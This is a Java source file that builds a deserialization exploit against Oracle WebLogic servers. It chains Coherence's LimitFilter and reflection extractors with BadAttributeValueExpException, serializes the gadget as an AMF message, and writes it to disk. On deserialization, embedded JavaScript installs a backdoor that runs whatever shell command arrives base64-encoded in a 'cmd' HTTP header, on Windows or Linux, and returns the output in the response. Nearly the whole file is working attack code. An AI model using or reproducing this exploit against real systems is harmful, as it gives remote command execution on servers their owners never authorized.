import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.*;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngineManager;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;

public class AMF {
    public static void main(String[] args) throws Exception {

        Object payload = getObject("calc");

        AttributeHolder attributeHolder = new AttributeHolder(payload);

        String file = "C:\\Users\\Public\\amf.bin";
        genExploit(attributeHolder, file);

    }

    public static void genExploit(Object payload, String file) throws IOException {

        FileOutputStream fout = new FileOutputStream(file);

        AmfTrace amfTrace = new AmfTrace();
        SerializationContext serializationContext = new SerializationContext();
        AmfMessageSerializer amfMessageSerializer = new AmfMessageSerializer();

        amfMessageSerializer.initialize(serializationContext,fout,amfTrace);

        ActionMessage actionMessage = new ActionMessage(3);
        MessageBody messageBody = new MessageBody();
        // set metaDataEntry Object in messageBody
        messageBody.setData(payload);

        actionMessage.addBody(messageBody);
        // write payload as amf format
        amfMessageSerializer.writeMessage(actionMessage);

    }


    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static Object getObject(final String command) throws Exception {
        String payload = "var m = java.lang.Class.forName('weblogic.work.ExecuteThread').getDeclaredMethod('getCurrentWork');\n" +
                "var theared = java.lang.Thread.currentThread();\n" +
                "var work = m.invoke(theared);\n" +
                "var connect = work.getClass().getDeclaredField('connectionHandler');\n" +
                "connect.setAccessible(true);\n" +
                "var conHandler = connect.get(work);\n" +
                "var re = conHandler.getClass().getDeclaredField('request');\n" +
                "re.setAccessible(true);\n" +
                "var request = re.get(conHandler);\n" +
                "var cmd = new java.lang.String(java.util.Base64.getDecoder().decode(request.getHeader('cmd')));\n" +
                "var res = request.getResponse();\n" +
                "var isW = java.lang.System.getProperty('os.name').toLowerCase().contains('win');\n" +
                "var listCmd = new java.util.ArrayList();\n" +
                "var p = new java.lang.ProcessBuilder('');\n" +
                "if(isW){p.command('cmd.exe','/c',cmd);\n" +
                "}else{p.command('/bin/bash','-c',cmd);\n" +
                "}p.redirectErrorStream(true);\n" +
                "var process = p.start();\n" +
                "var output = process.getInputStream();\n" +
                "var scanner = new java.util.Scanner(output,'UTF-8');\n" +
                "var out = '';\n" +
                "while(scanner.hasNext()){out += scanner.nextLine()+'\\n'};\n" +
                "var outputStream = res.getServletOutputStream();\n" +
                "outputStream.write(out.getBytes());\n" +
                "outputStream.flush();\n" +
                "res.getWriter().write('');\n" +
                "theared.interrput();";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[] {new Class[0] }

        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}

        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{ "JavaScript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[] {payload}
        );

        ReflectionExtractor extractor5 = new ReflectionExtractor(
                "toString",
                new Object[] {}
        );



        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4,
                extractor5
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");


        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);
        return badAttributeValueExpException;
    }


}
